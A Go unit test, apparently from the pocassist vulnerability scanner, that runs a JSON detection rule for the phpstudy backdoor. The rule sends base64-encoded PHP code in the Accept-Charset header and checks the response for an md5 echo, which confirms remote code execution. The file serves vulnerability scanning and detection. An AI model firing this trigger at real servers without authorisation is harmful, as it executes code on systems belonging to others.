package rule

import (
	"fmt"
	"pocassist/basic"
	"pocassist/utils"
	"testing"
)

func TestRunPlugins(t *testing.T) {
	basic.InitConfig("")
	basic.InitLog(false, "test.log")
	err := utils.InitFastHttpClient("127.0.0.1:8080")
	if err != nil {
		panic(err)
	}
	// handle初始化
	InitHandles()
	oreq, err := utils.GenOriginalReq("")
	if err != nil {
		panic(err)
	}
	jsonstr := `
{"name": "poc-yaml-phpstudy-backdoor-rce", "set": {"r": "randomLowercase(6)", "payload": "base64(\"printf(md5('\" + r + \"'));\")"}, "rules": [{"method": "GET", "path": "/index.php", "headers": {"Accept-Encoding": "gzip,deflate", "Accept-Charset": "{{payload}}"}, "follow_redirects": false, "expression": "response.body.bcontains(bytes(md5(r)))\n"}], "detail": {"author": "17bdw", "Affected Version": "phpstudy 2016-phpstudy 2018 php 5.2 php 5.4", "vuln_url": "php_xmlrpc.dll", "links": ["https://www.freebuf.com/column/214946.html"]}}
`
	poc, err := ParseJsonPoc([]byte(jsonstr))
	item := &ScanItem{oreq, &Plugin{
		Affects: "url",
		JsonPoc: poc,
	}}
	result, err := RunPoc(item)
	fmt.Println(result)
}

